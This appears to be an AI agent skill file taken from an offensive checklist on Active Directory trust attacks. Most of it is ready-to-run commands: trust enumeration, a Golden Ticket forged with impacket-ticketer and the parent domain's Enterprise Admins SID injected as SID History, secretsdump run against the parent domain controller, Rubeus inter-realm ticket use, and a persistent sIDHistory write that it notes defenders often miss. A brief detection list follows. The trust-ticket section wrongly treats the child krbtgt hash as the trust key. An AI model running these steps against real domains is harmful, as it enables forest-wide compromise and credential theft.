---
name: offensive-trust-attacks
description: "Forest and domain trust attacks — SID History injection in Golden Tickets (cross-forest admin via parent-RID 519), trust ticket forging for inter-realm TGT, SIDFiltering bypass, parent/child domain abuse (SIDFiltering disabled by default within forest), and external/forest trust enumeration. Use when the engagement spans multiple AD domains or when BloodHound surfaces cross-trust paths."
---

# Forest / Domain Trust Attacks

When the customer has more than one AD domain, trusts connect them. Attacks across trusts often promote one-domain compromise to forest-wide impact.

## Trust Types

| Type | Direction | SID Filtering Default |
|---|---|---|
| Parent-Child (within forest) | Two-way | **Disabled** by default |
| Tree (within forest) | Two-way | **Disabled** by default |
| External (between forests, classic) | Configurable | Enabled by default |
| Forest (cross-forest) | Configurable | Enabled by default |
| Realm (cross-platform Kerberos) | Configurable | Enabled by default |
| Shortcut | Two-way | Inherits from forest config |

**Key fact**: Within a forest, SID Filtering is **disabled** by default — meaning child-to-parent SID History injection works.

## Map Trusts

```powershell
# PowerView
Get-DomainTrust
Get-ForestTrust

# Per direction and type
Get-DomainTrust -Domain child.corp.local
```

```bash
# Linux equivalent via LDAP
ldapsearch -x -H ldap://child-dc -b "CN=System,DC=child,DC=corp,DC=local" \
  "(objectclass=trustedDomain)"
```

Note for each: `trustDirection` (in/out/both), `trustAttributes` (filtering, transitive, etc.).

## SID History Injection — Cross-Forest DA via Golden

If you compromise a child domain (DCSync krbtgt of `child.corp.local`), you can forge a Golden Ticket with the parent forest's Enterprise Admin SID in the `extra-sid` (SID History):

```bash
# child.corp.local krbtgt obtained
impacket-ticketer -nthash <child-krbtgt> \
  -domain-sid <child-SID> \
  -extra-sid <parent-SID>-519 \
  -domain child.corp.local \
  Administrator

# Result: TGT for child domain that includes Enterprise Admins SID
# Use against parent forest resources
KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pass parent-dc.corp.local
```

Within-forest SID Filtering disabled = parent's services accept the embedded `S-1-5-21-<parent>-519` (Enterprise Admins) as authoritative.

## SID Filtering Defenses

For **external / forest** trusts (default enabled), the foreign domain rejects SIDs from outside the trusted domain. Bypasses include:

- Filtering misconfigured (admin disabled it manually)
- Specific RID exceptions in the filtering ruleset
- Pre-Win2003 trust mode without filtering

## Trust Ticket Forging

When you have the trust account's hash (`krbtgt-of-child` from DCSync of child), you can forge an inter-realm TGT:

```bash
# Inter-realm TGT signed with trust key
Rubeus.exe asktgs /service:krbtgt/parent.local /ticket:trust-ticket.kirbi
```

The trust ticket lets you request TGS in the trusted domain.

## SIDHistory in User Objects

You can also write SIDHistory to user objects (with appropriate ACL) to grant cross-domain group memberships persistently:

```powershell
Set-ADUser -Identity victim -Replace @{sIDHistory='<foreign-admin-SID>'}
```

Defenders often miss audit on `sIDHistory` writes.

## Forest Functional Level

Older forest functional levels (2003) lack some defenses. Check:

```powershell
Get-ADForest | Select ForestMode
```

## Engagement Cheatsheet

```bash
# 1. Map all trusts
nltest /domain_trusts:corp.local
Get-DomainTrust

# 2. Identify accessible foreign domains
# 3. If child compromised + forest trust within (parent):
#    DCSync child krbtgt
#    Golden Ticket with parent EA SID in extra-sid

# 4. For external/forest trust with filtering off:
#    Same SID History technique
#    Or use trust ticket forging if trust key available

# 5. Document: trust type, direction, attack used, achieved access
```

## Detection

- Cross-domain authentication anomalies (MDI cross-tenant detection)
- DCSync from foreign source (DC event correlation)
- SID History writes (LDAP audit)

## Key References

- "It's All About Trust" (Will Schroeder)
- Microsoft AD Forest Best Practices
- "SID Filtering and Forest Trusts"
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/trust-attacks.md
